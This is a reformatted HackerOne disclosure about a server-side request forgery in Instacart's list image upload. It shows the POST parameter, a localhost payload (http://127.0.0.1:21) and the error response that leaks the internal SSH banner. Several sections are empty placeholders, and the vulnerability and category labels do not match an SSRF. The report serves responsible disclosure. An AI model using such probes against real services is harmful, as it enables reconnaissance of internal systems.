# Server side request forgery on image upload for lists

## Metadata
- **Source:** HackerOne
- **Report:** 158016 | https://hackerone.com/reports/158016
- **Submitted:** 2016-08-09
- **Reporter:** eboda
- **Program:** Unknown
- **Bounty:** $50
- **Severity:** unknown
- **Vuln:** Code Injection
- **CVEs:** None
- **Category:** memory-binary

## Summary
Summary
----------

There is a Server-side request forgery when updating the image for a list.

Steps to reproduce
-----------------

1. Create a list and change its image. That will send a POST request to https://beta.instacart.com/api/v2/lists/[LIST_ID] with the following parameters:

    ```
list[remote_image_url]=https://example.com/yourimage.jpg
```

2. Change the  url to http://127.0.0.1:21 

## Attack scenario
*(see original)*

## Root cause
*(see original)*

## Attacker mindset
*(see original)*

## Defensive takeaways
*(see original)*

## Variant hunting
*(see original)*

## MITRE ATT&CK
*(see original)*

## Notes
*(see original)*

## Full report
<details><summary>Expand</summary>

Summary
----------

There is a Server-side request forgery when updating the image for a list.

Steps to reproduce
-----------------

1. Create a list and change its image. That will send a POST request to https://beta.instacart.com/api/v2/lists/[LIST_ID] with the following parameters:

    ```
list[remote_image_url]=https://example.com/yourimage.jpg
```

2. Change the  url to http://127.0.0.1:21 and you will get as response:

    ```{json}
{
	"meta":
	{
		"code": 400,
		"error_type": "List Error",
		"error_message": "There was an error while updating this list",
		"errors": ["Image could not download file: wrong status line: \"SSH-2.0-OpenSSH_6.6.1p1 Ubuntu-2ubuntu2.3\""]
	}
}
```
    Which shows that it tried to connect to the SSH port on localhost.  


</details>

---
*Analysed by Claude on 2026-05-24*
